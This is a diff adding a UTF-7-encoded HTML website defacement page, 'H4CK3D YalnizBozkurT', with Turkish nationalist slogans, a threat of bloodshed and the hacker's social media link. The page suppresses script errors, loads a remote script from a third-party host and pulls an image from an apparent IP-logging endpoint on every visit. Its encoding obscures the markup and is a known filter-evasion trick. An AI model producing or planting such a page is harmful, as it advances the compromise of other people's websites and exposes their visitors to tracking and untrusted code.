@@ -1,0 +1,972 @@
++ADw-/title+AD4APA-html+AD4
++ADw-head+AD4
++ADw-title+AD4-H4CK3D YalnizBozkurT+ADw-/title+AD4
++ADw-body background+AD0AIg-http://d1303.hizliresim.com/17/r/lcxmp.gif+ACI bgcolor+AD0AIg-black+ACIAPg
++ADw-link rel+AD0AIg-icon+ACI href+AD0AIg-http://icons.iconarchive.com/icons/iconscity/flags/16/turkey-icon.png+ACI type+AD0AIg-T+APw-rk Bayra+ACYAIw-287+ADsAJgAj-305+ADs icon+ACI /+AD4
++ADw-a+AD4APA-img src+AD0 +ACI-http://imageshack.us/a/img823/609/images2ccy.jpg+ACI title+AD0 +ACI-HACKER YalnizBozkurT+ACI width+AD0-200+ACI height+AD0AIg-150+ACI align+AD0AIg-right+ACIAPgA8-/a+AD4
++ADw-a+AD4APA-img src+AD0 +ACI-http://imageshack.us/a/img41/6813/57809150.jpg+ACI title+AD0 +ACI-HACKER YalnizBozkurT+ACI width+AD0-200+ACI height+AD0AIg-150+ACI align+AD0AIg-left+ACIAPgA8-center+AD4
++ADw-center+AD4APA-img src+AD0AIg-http://r1308.hizliresim.com/1d/6/r6x9c.png+ACIAPgA8-/img+AD4
++ADw-/head+AD4
++ADw-body bgcolor+AD0-0+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPgA8-/center+AD4APA-/div+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPgA8-/script+AD4
++ADw-style+AD4-/+ACo-Kod Dostu Cursor START+ACo-/ body, a:hover, h2, h1, table, td, div, p, img+AHs-cursor: url(http://cur.cursors-4u.net/cursors/cur-8/cur756.cur), progress +ACE-important+ADsAfQ /+ACo-Kod Dostu Cursor STOP+ACo-/+ADw-/style+AD4
++ADw-a +ADw-img src+AD0AIg-http://in3.sitekodlari.com/ipadresi6.php+ACI border+AD0AIg-0+ACI alt+AD0AIg-ip adresi+ACIAPgA8-/a+AD4
++ADw-style+AD4
+body +AHs
+background: +ACM-000000 url() no-repeat top center+ADs
+color: +ACM-ff0000+ADs
+font-family: Courier New+ADs
+font-size: 12px+ADs
++AH0
++ACM-black+AHs
+text-align: center+ADs
+font-size:12px+ADs
+font-weight: bold+ADs
++AH0
+a:link, a:visited +AHs-font-weight:normal+ADs text-decoration:none+ADs color:+ACM-ffF000+ADsAfQ
+a:hover +AHs-font-weight:bold+ADs text-decoration:none+ADs cursor:help+ADsAfQ
+.style1 +AHs
+font-family: Georgia, +ACI-Times New Roman+ACI, Times, serif+ADs
+font-size: 16px+ADs
++AH0
+.style2 +AHs-color: +ACM-FFFFFF+AH0
+.style4 +AHs-font-size: 12px+AH0
+.style5 +AHs
+font-size: medium+ADs
+font-weight: bold+ADs
+font-family: +ACI-Courier New+ACI, Courier, monospace+ADs
++AH0
+.style7 +AHs
+font-size: large+ADs
+font-weight: bold+ADs
+color: +ACM-FFFFFF+ADs
++AH0
+.style11 +AHs
+font-size: x-large+ADs
+color: +ACM-FFFFFF+ADs
++AH0
+.style12 +AHs-color: +ACM-S+ADs font-size: large+AH0
+.style13 +AHs-color: +ACM-FFFFFF+ADs font-size: medium+ADs font-weight: bold+ADs color: +ACM-FF0000+ADsAfQ
+.style14 +AHs-color: +ACM-FFFFFF+ADs font-size: large+ADs font-weight: bold+ADsAfQ
+.style15 +AHs-color: +ACM-FFFFFF+ADs font-size: large+ADs +AH0
+.style16 +AHs-font-weight: bold+AH0
++ADw-/style+AD4
++ADw-head+AD4
++ADw-script language+AD0AIg-Hacked Yalniz Bozkurt+ACIAPg
+function ClearError() +AHs-return true+ADsAfQ
+window.onerror +AD0 ClearError+ADs
++ADw-/script+AD4
++ADw-div align+AD0AIg-center+ACIAPgA8-table width+AD0AIg-70+ACUAIg border+AD0AIg-0+ACIAPg
++ADw-tbody+AD4APA-tr+AD4APA-td+AD4APA-p+AD4 +ADw-/p+AD4
++ADw-center+AD4
++ADw-font size+AD0AIg-6+ACI face+AD0AIg-snap itc+ACIAPgA8-b+AD4APA-span id+AD0AIg-lightf+AF8-light+ACIAPgA8-/span+AD4APA-/b+AD4APA-/font+AD4
++ADw-script+AD4
+lightf+AF8-lightcolor1+AD0	+ACI-FFFFFF+ACI
+lightf+AF8-lightcolor2+AD0	+ACI-FFFFFF+ACI
+lightf+AF8-speed+AD0		75
+color+AF8-mesk+AD0-new Array()+ADs
+color+AF8-mesk+AFs-10+AF0APQAi-A+ACIAOw
+color+AF8-mesk+AFs-11+AF0APQAi-B+ACIAOw
+color+AF8-mesk+AFs-12+AF0APQAi-C+ACIAOw
+color+AF8-mesk+AFs-13+AF0APQAi-D+ACIAOw
+color+AF8-mesk+AFs-14+AF0APQAi-E+ACIAOw
+color+AF8-mesk+AFs-15+AF0APQAi-F+ACIAOw
+color+AF8-A+AD0-10+ADs
+color+AF8-B+AD0-11+ADs
+color+AF8-C+AD0-12+ADs
+color+AF8-D+AD0-13+ADs
+color+AF8-E+AD0-14+ADs
+color+AF8-F+AD0-15+ADs
+color+AF8-let+AD0AIg-ABCDEF+ACIAOw
+function color+AF8-mes(color+AF8-num)
++AHs
+if(color+AF8-let.indexOf(color+AF8-num) +ACEAPQ -1)
++AHs
+return eval(+ACI-color+AF8AIg +ACs color+AF8-num)
++AH0
+else
++AHs
+if(color+AF8-num +ADw 10)
++AHs
+return eval(color+AF8-num)
++AH0
+else
++AHs
+return color+AF8-mesk+AFs-color+AF8-num+AF0AOw
++AH0
++AH0
++AH0
+function color(color+AF8-begin,color+AF8-einde,color+AF8-stappen,color+AF8-stap)
++AHs
+color+AF8-hh1+AD0(color+AF8-mes(color+AF8-begin.charAt(0))+ACo-16)+ACs-color+AF8-mes(color+AF8-begin.charAt(1))+ADs
+color+AF8-hh2+AD0(color+AF8-mes(color+AF8-begin.charAt(2))+ACo-16)+ACs-color+AF8-mes(color+AF8-begin.charAt(3))+ADs
+color+AF8-hh3+AD0(color+AF8-mes(color+AF8-begin.charAt(4))+ACo-16)+ACs-color+AF8-mes(color+AF8-begin.charAt(5))+ADs
+color+AF8-pp1+AD0(color+AF8-mes(color+AF8-einde.charAt(0))+ACo-16)+ACs-color+AF8-mes(color+AF8-einde.charAt(1))+ADs
+color+AF8-pp2+AD0(color+AF8-mes(color+AF8-einde.charAt(2))+ACo-16)+ACs-color+AF8-mes(color+AF8-einde.charAt(3))+ADs
+color+AF8-pp3+AD0(color+AF8-mes(color+AF8-einde.charAt(4))+ACo-16)+ACs-color+AF8-mes(color+AF8-einde.charAt(5))+ADs
+if(color+AF8-hh1 +ADw color+AF8-pp1)
++AHs
+color+AF8-ff1+AD0-color+AF8-hh1+ACs-Math.floor((color+AF8-pp1-color+AF8-hh1)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff1+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff1/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff1-(Math.floor(color+AF8-ff1/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+else
++AHs
+color+AF8-ff1+AD0-color+AF8-hh1-Math.floor((color+AF8-hh1-color+AF8-pp1)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff1+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff1/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff1-(Math.floor(color+AF8-ff1/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+if(color+AF8-hh2 +ADw color+AF8-pp2)
++AHs
+color+AF8-ff2+AD0-color+AF8-hh2+ACs-Math.floor((color+AF8-pp2-color+AF8-hh2)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff2+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff2/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff2-(Math.floor(color+AF8-ff2/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+else
++AHs
+color+AF8-ff2+AD0-color+AF8-hh2-Math.floor((color+AF8-hh2-color+AF8-pp2)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff2+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff2/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff2-(Math.floor(color+AF8-ff2/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+if(color+AF8-hh3 +ADw color+AF8-pp3)
++AHs
+color+AF8-ff3+AD0-color+AF8-hh3+ACs-Math.floor((color+AF8-pp3-color+AF8-hh3)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff3+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff3/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff3-(Math.floor(color+AF8-ff3/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+else
++AHs
+color+AF8-ff3+AD0-color+AF8-hh3-Math.floor((color+AF8-hh3-color+AF8-pp3)/color+AF8-stappen+ACo-color+AF8-stap)+ADs
+color+AF8-ff3+AD0-eval(+ACI’+ACIAKw-color+AF8-mes(Math.floor(color+AF8-ff3/16))+ACsAIg’+ACI)+ACs-eval(+ACI’+ACIAKw-color+AF8-mes(color+AF8-ff3-(Math.floor(color+AF8-ff3/16)+ACo-16))+ACsAIg’+ACI)+ADs
++AH0
+return color+AF8-ff1+ACs-color+AF8-ff2+ACs-color+AF8-ff3
++AH0
+lightf+AF8-num+AD0-0+ADs
+lightf+AF8-num2+AD0-0+ADs
+lightf+AF8-txt+AD0-new Array()+ADs
+lightf+AF8-txt+AFs-0+AF0APQAiACIAOw
+function lightf()
++AHs
+for(lightf+AF8-i+AD0-0+ADs-lightf+AF8-i +ACEAPQ Math.floor(lightf+AF8-message.length/2)+ADs-lightf+AF8-i+ACsAKw)
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-i+AF0APQ-color(lightf+AF8-lightcolor1,lightf+AF8-lightcolor2,Math.floor(lightf+AF8-message.length/2),lightf+AF8-i)+ADs
++AH0
+for(lightf+AF8-i+AD0-Math.floor(lightf+AF8-message.length/2)+ADs-lightf+AF8-i +ACEAPQ lightf+AF8-message.length+ADs-lightf+AF8-i+ACsAKw)
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-i+AF0APQ-color(lightf+AF8-lightcolor2,lightf+AF8-lightcolor1,Math.floor(lightf+AF8-message.length/2),(lightf+AF8-i-Math.floor(lightf+AF8-message.length/2)))+ADs
++AH0
+lightf+AF8-lightf1()+ADs
++AH0
+function lightf+AF8-lightf1()
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0APQAiACIAOw
+lightf+AF8-num2+AD0-lightf+AF8-message.length-lightf+AF8-num+ADs
+for(lightf+AF8-i+AD0-0+ADs-lightf+AF8-i +ACEAPQ lightf+AF8-message.length+ADs-lightf+AF8-i+ACsAKw)
++AHs
+if(lightf+AF8-i+ACs-lightf+AF8-num +ADw lightf+AF8-message.length)
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0APQ-lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0AKwAiADw-font color+AD0′+ACMAIgAr-lightf+AF8-txt+AFs(lightf+AF8-i+ACs-lightf+AF8-num)+AF0AKwAi’+AD4AIgAr-lightf+AF8-message.charAt(lightf+AF8-i)+ACsAIgA8-/font+AD4AIgA7
++AH0
+else
++AHs
+lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0APQ-lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0AKwAiADw-font color+AD0′+ACMAIgAr-lightf+AF8-txt+AFs-lightf+AF8-i-lightf+AF8-num2+AF0AKwAi’+AD4AIgAr-lightf+AF8-message.charAt(lightf+AF8-i)+ACsAIgA8-/font+AD4AIgA7
++AH0
++AH0
+if(lightf+AF8-num +ACEAPQ lightf+AF8-message.length)
++AHs
+lightf+AF8-num+ACsAKwA7
++AH0
+else
++AHs
+lightf+AF8-num+AD0-0+ADs
++AH0
+lightf+AF8-light.innerHTML+AD0-lightf+AF8-txt+AFs-lightf+AF8-message.length+ACs-1+AF0AOw
+setTimeout(+ACI-lightf+AF8-lightf1()+ACI,lightf+AF8-speed)
++AH0
+lightf()+ADs
++ADw-/script+AD4APA-/center+AD4
++ADw-/br+AD4
++ADw-style type+AD0AIg-text/css+ACIAPg
+BODY +AHs
+SCROLLBAR-FACE-COLOR: +ACM-000000+ADs SCROLLBAR-HIGHLIGHT-COLOR: +ACM-000000+ADs SCROLLBAR-SHADOW-COLOR: +ACM-000000+ADs SCROLLBAR-3DLIGHT-COLOR: +ACM-000000+ADs SCROLLBAR-ARROW-COLOR: +ACM-ffffff+ADs SCROLLBAR-TRACK-COLOR: +ACM-ffffff+ADs FONT-FAMILY: Courier New+ADs SCROLLBAR-DARKSHADOW-COLOR: +ACM-000000
++AH0
+.Estilo10 +AHs
+COLOR: +ACM-ffffff+ADs FONT-FAMILY: Courier New
++AH0
+.Estilo8 +AHs
+FONT-SIZE: 10px+ADs COLOR: +ACM-ffffff+ADs FONT-FAMILY: Courier New
++AH0
++ADw-/style+AD4
++ADw-script language+AD0AIg-JavaScript+ACIAPg
+TypingText +AD0 function(element, interval, cursor, finishedCallback) +AHs
+if((typeof document.getElementById +AD0APQ +ACI-undefined+ACI) +AHwAfA (typeof element.innerHTML +AD0APQ +ACI-undefined+ACI)) +AHs
+this.running +AD0 true+ADs
+return+ADs
++AH0
+this.element +AD0 element+ADs
+this.finishedCallback +AD0 (finishedCallback ? finishedCallback : function() +AHs return+ADs +AH0)+ADs
+this.interval +AD0 (typeof interval +AD0APQ +ACI-undefined+ACI ? 20 : interval)+ADs
+this.origText +AD0 this.element.innerHTML+ADs
+this.unparsedOrigText +AD0 this.origText+ADs
+this.cursor +AD0 (cursor ? cursor : +ACIAIg)+ADs
+this.currentText +AD0 +ACIAIgA7
+this.currentChar +AD0 0+ADs
+this.element.typingText +AD0 this+ADs
+if(this.element.id +AD0APQ +ACIAIg) this.element.id +AD0 +ACI-typingtext+ACI +ACs TypingText.currentIndex+ACsAKwA7
+TypingText.all.push(this)+ADs
+this.running +AD0 false+ADs
+this.inTag +AD0 false+ADs
+this.tagBuffer +AD0 +ACIAIgA7
+this.inHTMLEntity +AD0 false+ADs
+this.HTMLEntityBuffer +AD0 +ACIAIgA7
++AH0
+TypingText.all +AD0 new Array()+ADs
+TypingText.currentIndex +AD0 0+ADs
+TypingText.runAll +AD0 function() +AHs
+for(var i +AD0 0+ADs i +ADw TypingText.all.length+ADs i+ACsAKw) TypingText.all+AFs-i+AF0.run()+ADs
++AH0
+TypingText.prototype.run +AD0 function() +AHs
+if(this.running) return+ADs
+if(typeof this.origText +AD0APQ +ACI-undefined+ACI) +AHs
+setTimeout(+ACI-document.getElementById(‘+ACI +ACs this.element.id +ACs +ACI’).typingText.run()+ACI, this.interval)+ADs
+return+ADs
++AH0
+if(this.currentText +AD0APQ +ACIAIg) this.element.innerHTML +AD0 +ACIAIgA7
+if(this.currentChar +ADw this.origText.length) +AHs
+if(this.origText.charAt(this.currentChar) +AD0APQ +ACIAPAAi +ACYAJg +ACE-this.inTag) +AHs
+this.tagBuffer +AD0 +ACIAPAAiADs
+this.inTag +AD0 true+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.origText.charAt(this.currentChar) +AD0APQ +ACIAPgAi +ACYAJg this.inTag) +AHs
+this.tagBuffer +ACsAPQ +ACIAPgAiADs
+this.inTag +AD0 false+ADs
+this.currentText +ACsAPQ this.tagBuffer+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.inTag) +AHs
+this.tagBuffer +ACsAPQ this.origText.charAt(this.currentChar)+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.origText.charAt(this.currentChar) +AD0APQ +ACIAJgAi +ACYAJg +ACE-this.inHTMLEntity) +AHs
+this.HTMLEntityBuffer +AD0 +ACIAJgAiADs
+this.inHTMLEntity +AD0 true+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.origText.charAt(this.currentChar) +AD0APQ +ACIAOwAi +ACYAJg this.inHTMLEntity) +AHs
+this.HTMLEntityBuffer +ACsAPQ +ACIAOwAiADs
+this.inHTMLEntity +AD0 false+ADs
+this.currentText +ACsAPQ this.HTMLEntityBuffer+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else if(this.inHTMLEntity) +AHs
+this.HTMLEntityBuffer +ACsAPQ this.origText.charAt(this.currentChar)+ADs
+this.currentChar+ACsAKwA7
+this.run()+ADs
+return+ADs
++AH0 else +AHs
+this.currentText +ACsAPQ this.origText.charAt(this.currentChar)+ADs
++AH0
+this.element.innerHTML +AD0 this.currentText+ADs
+this.element.innerHTML +ACsAPQ (this.currentChar +ADw this.origText.length – 1 ? (typeof this.cursor +AD0APQ +ACI-function+ACI ? this.cursor(this.currentText) : this.cursor) : +ACIAIg)+ADs
+this.currentChar+ACsAKwA7
+setTimeout(+ACI-document.getElementById(‘+ACI +ACs this.element.id +ACs +ACI’).typingText.run()+ACI, this.interval)+ADs
++AH0 else +AHs
+this.currentText +AD0 +ACIAIgA7
+this.currentChar +AD0 0+ADs
+this.running +AD0 false+ADs
+this.finishedCallback()+ADs
++AH0
++AH0
++ADw-/script+AD4
++ADw-style+AD4
+td+AHs-font-family: courier new+ADs font-size: 9pt+ADs color: red+AH0
+a+AHs-font-family: courier new+ADs font-size: 12pt+ADs color: red+AH0
++ADw-/style+AD4
++ADw-/p+AD4
++ADw-div id+AD0AIg-example1+ACIAPgA8-/div+AD4
++ADw-p align+AD0AIg-center+ACI id+AD0AIg-example2+ACIAPg +ADw-span class+AD0AIg-style5+ACIAPgA8-span class+AD0AIg-style11+ACIAPg-Ne Mutlu Ki Bana Hem T+ANw-RK Hemde +ANw-LK+ANw-C+ANw Do+ACYAIw-287+ADs-mu+ACYAIw-351+ADs-um+ADw-/br+AD4
+——————————————-+ADw-/br+AD4
+Mevzu Bahis Vatansa Gerisi Teferruatt+ACYAIw-305+ADs-r+ADw-/br+AD4
+——————————————-+ADw-/br+AD4
+Bazen Bir +ACYAIw-350+ADs-eyleri De+ACYAIw-287+ADs-i+ACYAIw-351+ADs-tirmek Gerekir…+ADw-/br+AD4
+Sometimes Must Be Something…+ADw-/br+AD4
+——————————————-+ADw-/br+AD4APA-/span+AD4 +ADw-/span+AD4
++ADw-span class+AD0AIg-style12+ACIAPgA8-/b+AD4 +ADw-span class+AD0AIg-style13+ACIAPgA8-/br+AD4
+———————————- +ADw-/br+AD4
++AHw BOZKURT Y+APw-reklilere Selam Olsun. +AHwAPA-/br+AD4
+———————————-+ADw-/br+AD4
++ADw-/span+AD4APA-/span+AD4
++ADw-br+AD4
++ADw-span class+AD0AIg-style7+ACIAPg-Ya Kan Kustururuz Ya da Sonsuza Dek Sustururuz+ACEAIQA8-/span+AD4APA-/p+AD4
++ADw-p+AD4APA-span class+AD0AIg-style4+ACIAPg
++ADw-script type+AD0AIg-text/javascript+ACIAPg
++ADw-/script+AD4
++ADw-/span+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPgA8-/script+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPg
+new TypingText(document.getElementById(+ACI-example1+ACI))+ADs
+new TypingText(document.getElementById(+ACI-example2+ACI), 12, function(i)+AHs
+var ar +AD0 new Array(+ACIAPAAi,+ACI +ACI,+ACI-/+ACI,+ACIAPgAi)+ADs return +ACI +ACI +ACs ar+AFs-i.length +ACU
+ar.length+AF0AOw +AH0)+ADs
+TypingText.runAll()+ADs
++ADw-/script+AD4
++ADw-br+AD4
++ADw-/p+AD4
++ADw-p align+AD0AIg-center+ACIAPgA8-span class+AD0AIg-style14+ACIAPg D+APw-sman Senaryo Yazar…Biz +ACYAIw-304+ADs-se TAR+ACYAIw-304+ADs-H+ADw-br/+AD4
++ADw-br/+AD4
++ACYAIw-304+ADs-LET+ACYAIw-304+ADsAJgAj-350+ADsAJgAj-304+ADs-M+ADw-br/+AD4
++ADw-a href+AD0AIg-http://www.facebook.com/cCcYalnizBozkurT+ACIAPgA8-img src+AD0AIg-http://legacytechnologyservices.files.wordpress.com/2013/08/facebook-32×32-icon.png?w+AD0-625+ACI border+AD0AIg-0+ACI alt+AD0AIg-YalnizBozkurT+ACI title+AD0AIg-YalnizBozkurT+ACI width+AD0AIg-32+ACI height+AD0AIg-32+ACIAPgA8-/a+AD4
++ADw-br /+AD4
++ADw-center+AD4
++ADw-/p+AD4
++ADw-marquee+AD4
++ADw-span class+AD0AIg-style15+ACIAPgA8-strong+AD4A3A-lk+APw U+ACYAIw-287+ADs-runda G+APY-n+APw-ller Delidir, Ki+ACYAIw-351+ADs-iler +ANw-lk+APw U+ACYAIw-287+ADs-runda +ANY-lmelidir..+ACEAPA-/strong+AD4APA-/span+AD4
++ADw-/marquee+AD4
++ADw-strong+AD4APA-/strong+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPg function showHideFX()+AHs var FX +AD0 document.getElementById(+ACI-FX+ACI)+ADs var w +AD0 FX.offsetWidth+ADs FX.opened ? moveFX(0, 40-w) : moveFX(40-w, 0)+ADs FX.opened +AD0 +ACE-FX.opened+ADs +AH0 function moveFX(x0, xf)+AHs var FX +AD0 document.getElementById(+ACI-FX+ACI)+ADs var dx +AD0 Math.abs(x0-xf) +AD4 10 ? 5 : 1+ADs var dir +AD0 xf+AD4-x0 ? 1 : -1+ADs var x +AD0 x0 +ACs dx +ACo dir+ADs FX.style.right +AD0 x.toString() +ACs +ACI-px+ACIAOw if(x0+ACEAPQ-xf)+AHs-setTimeout(+ACI-moveFX(+ACIAKw-x+ACsAIg, +ACIAKw-xf+ACsAIg)+ACI, 10)+ADsAfQ +AH0 +ADw-/script+AD4
++ADw-/div+AD4
++ADw-param name+AD0AIg-movie+ACI value+AD0AIg-http://www.cyber-warrior.org/iphacked/fair.swff+ACIAPg
++ADw-param name+AD0AIg-bgcolor+ACI value+AD0AIgAj-000000+ACIAPg
++ADw-param name+AD0AIg-FlashVars+ACI value+AD0AIg-mp3+AD0-http://k003.kiwi6.com/hotlink/dyd2mv9un6/muhtesem+AF8-yuezyil+AF8-mehter+AF8-marsi.mp3+ACY-amp+ADs-autoplay+AD0-1+ACY-amp+ADs-loadingcolor+AD0-000000+ACY-amp+ADs-slidercolo+ACIAPg +ADw-/object+AD4
++ADw-/font+AD4
++ADw-/div+AD4APA-/b+AD4APA-/body+AD4APA-/html+AD4
++ADw-script language+AD0AIg-javascript+ACI src+AD0AIg-http://in.sitekodlari.com/sagtus.js+ACIAPgA8-/script+AD4
++ADw-style+AD4
++ACM-fifteenth, +ACM-sixteenth+AHs-position:absolute+ADs-left:0+ADs-top:0+ADs-width:1px+ADs-height:1px+ADs-layer-background-color:black+ADs-background-color:+ACM-00FF00+ADs-z-index:100+ADs-font-size:1px+ADsAfQ
++ADw-/style+AD4
++ADw-script language+AD0′javascript’ type+AD0′text/javascript’+AD4
+first3+AD0-24+ADs
+if (document.all+ACYAJgAh-window.print)+AHs-fifteenth.style.width+AD0-document.body.clientWidth-3+ADs-sixteenth.style.height+AD0-document.body.clientHeight-1+ADsAfQ-second3+AD0-first3+ACs-6+ADs third3+AD0-first3+ACs-second3+ADs fourth3+AD0-first3+ACs-second3+ACs-third3+ADs fifth3+AD0-fourth3/third3+ACo-first3+ADs sixth3+AD0-third3+ACo-first3/12+ACo-second3+ADs seventh3+AD0-first3+ACs-second3/fifth3-16+ACo-fourth3+ADs eighth3+AD0-sixth3+ACo(first3-5)/third3+ACs-fourth3+ADs ninth3+AD0-eighth3/seventh3+ACs-first3+ACo-third3-fourth3+ADs-tenth3+AD0(ninth3+ACs-first3/third3+ACo-fourth3+ACs-second3+ACo-fifth3)/sixth3+ACs-eighth3-ninth3-1+ADs-eleventh3+AD0-Math.floor(tenth3) +ADs-twelfth3+AD0-eleventh3-58+ADs
+function seventeenth()+AHs-fifteenth.style.pixelTop+AD0-document.body.scrollTop+ACs-event.clientY+ACs-twelfth3+ADs-sixteenth.style.pixelTop+AD0-document.body.scrollTop+ADs
+if (event.clientX+ADw-document.body.clientWidth-twelfth3)sixteenth.style.pixelLeft+AD0-document.body.scrollLeft+ACs-event.clientX+ACs-twelfth3+ADs
+else sixteenth.style.pixelLeft+AD0-document.body.clientWidth-twelfth3+ADsAfQ
+function eighteenth(nineteenth)+AHs-document.fifteenth.top+AD0-nineteenth.y+ACs-twelfth3+ADs-document.sixteenth.top+AD0-pageYOffset+ADs-document.sixteenth.left+AD0-nineteenth.x+ACs-twelfth3+ADsAfQ
+if (document.all)document.onmousemove+AD0-seventeenth+ADs
+function twentieth()+AHs-window.location.reload()+ADsAfQ
+function first2()+AHs-setTimeout(‘window.onresize+AD0-twentieth’,300)+ADsAfQ
+if ((document.all+ACYAJgAh-window.print)+AHwAfA-document.layers)window.onload+AD0-first2+ADs-document.write(+ACIAPA-div id+AD0′fifteenth’ style+AD0′width:expression(document.body.clientWidth-twelfth3)’+AD4APA-/div+AD4APA-div id+AD0′sixteenth’ style+AD0′height:expression(document.body.clientHeight-twelfth3)’+AD4APA-/div+AD4AIg)+ADs
++ADw-/script+AD4
++ADw-span style+AD0AIg-font-family: Fixedsys+ADsAIgA+ADw-/span+AD4APA-/p+AD4APA-/span+AD4APA-script language+AD0AIg-javascript+ACIAPg-var text+AD0′Hacked YalnizBozkurt…+ACE’+ADs-var delay+AD0-5+ADs var Xoff+AD0-0+ADs var Yoff+AD0–30+ADs-var txtw+AD0-10+ADs var beghtml+AD0′+ADw-font color+AD0AIgAj-FFFFFF+ACIAPgA8-b+AD4′+ADs var endhtml+AD0′+ADw-/b+AD4APA-/font+AD4′+ADs ns4 +AD0 (navigator.appName.indexOf(+ACI-Netscape+ACI)+AD4APQ-0 +ACYAJg document.layers)? true : false+ADs-ie4 +AD0 (document.all +ACYAJg +ACE-document.getElementById)? true : false+ADs-ie5 +AD0 (document.all +ACYAJg document.getElementById)? true : false+ADs-ns6 +AD0 (document.getElementById +ACYAJg navigator.appName.indexOf(+ACI-Netscape+ACI)+AD4APQ-0 )? true: false+ADs-var txtA+AD0-new Array()+ADs-text+AD0-text.split(”)+ADs-var x1+AD0-0+ADs-var y1+AD0–50+ADs-var t+AD0”+ADs-for(i+AD0-1+ADs-i+ADwAPQ-text.length+ADs-i+ACsAKw)+AHs-t+ACsAPQ(ns4)? ‘+ADw-layer left+AD0AIg-0+ACI top+AD0AIg–100+ACI width+AD0AIg’+ACs-txtw+ACs’+ACI name+AD0AIg-txt’+ACs-i+ACs’+ACI height+AD0AIg-1+ACIAPg’ : ‘+ADw-div id+AD0AIg-txt’+ACs-i+ACs’+ACI style+AD0AIg-position:absolute+ADs top:-100px+ADs left:0px+ADs height:1px+ADs width:’+ACs-txtw+ACs’+ADs visibility:visible+ADsAIgA+’+ADs-t+ACsAPQ-beghtml+ACs-text+AFs-i-1+AF0AKw-endhtml+ADs-t+ACsAPQ(ns4)? ‘+ADw-/layer+AD4′ : ‘+ADw-/div+AD4′+ADsAfQ-document.write(t)+ADs-function moveid(id,x,y)+AHs-if(ns4)id.moveTo(x,y)+ADs-else+AHs-id.style.left+AD0-x+ACs’px’+ADs-id.style.top+AD0-y+ACs’px’+ADsAfQB9-function animate(evt)+AHs-x1+AD0-Xoff+ACs((ie4+AHwAfA-ie5)?event.clientX+ACs-document.body.scrollLeft:evt.pageX)+ADs-y1+AD0-Yoff+ACs((ie4+AHwAfA-ie5)?event.clientY+ACs-document.body.scrollTop:evt.pageY)+ADsAfQ-function getidleft(id)+AHs-if(ns4)return id.left+ADs-else return parseInt(id.style.left)+ADsAfQ-function getidtop(id)+AHs-if(ns4)return id.top+ADs-else return parseInt(id.style.top)+ADsAfQ-function getwindowwidth()+AHs-if(ie4+AHwAfA-ie5)return document.body.clientWidth+ACs-document.body.scrollLeft+ADs-else return window.innerWidth+ACs-pageXOffset+ADsAfQ-function movetxts()+AHs-for(i+AD0-text.length+ADs-i+AD4-1+ADs-i+AD0-i-1)+AHs-if(getidleft(txtA+AFs-i-1+AF0)+ACs-txtw+ACo-2+AD4APQ-getwindowwidth())+AHs-moveid(txtA+AFs-i-1+AF0,0,-100)+ADs-moveid(txtA+AFs-i+AF0,0,-100)+ADsAfQ-else moveid(txtA+AFs-i+AF0, getidleft(txtA+AFs-i-1+AF0)+ACs-txtw, getidtop(txtA+AFs-i-1+AF0))+ADsAfQ-moveid(txtA+AFs-1+AF0,x1,y1)+ADsAfQ-window.onload+AD0-function()+AHs-for(i+AD0-1+ADs-i+ADwAPQ-text.length+ADs-i+ACsAKw)txtA+AFs-i+AF0APQ(ns4)?document.layers+AFs’txt’+ACs-i+AF0:(ie4)?document.all+AFs’txt’+ACs-i+AF0:document.getElementById(‘txt’+ACs-i)+ADs-if(ns4)document.captureEvents(Event.MOUSEMOVE)+ADs-document.onmousemove+AD0-animate+ADs-setInterval(‘movetxts()’,delay)+ADsAfQA8-/script+AD4APA-script language+AD0AIg-JavaScript+ACI type+AD0AIg-text/javascript+ACIAPg-var xCol +AD0 +ACIAIw-FF0000+ACIAOw-var yCol +AD0 +ACIAIw-990000+ACIAOw-var zCol +AD0 +ACIAIw-FF3300+ACIAOw-var n +AD0 6+ADs
+//number of dots per trail.var t +AD0 40+ADs
